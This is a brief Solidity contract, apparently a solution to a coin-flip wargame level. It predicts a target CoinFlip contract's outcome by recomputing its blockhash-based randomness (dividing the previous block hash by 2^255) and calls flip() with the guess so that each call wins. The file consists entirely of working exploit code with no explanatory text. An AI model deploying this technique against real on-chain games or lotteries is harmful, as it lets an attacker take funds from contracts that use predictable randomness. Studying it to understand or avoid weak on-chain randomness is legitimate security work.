pragma solidity ^0.4.18;

contract CoinPrediction {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address coinflipContract;

  function CoinPrediction(address coin) public {
    coinflipContract = coin;
  }

  function flip() public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number - 1));

    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;
    return CoinFlip(coinflipContract).flip(side);
  }
}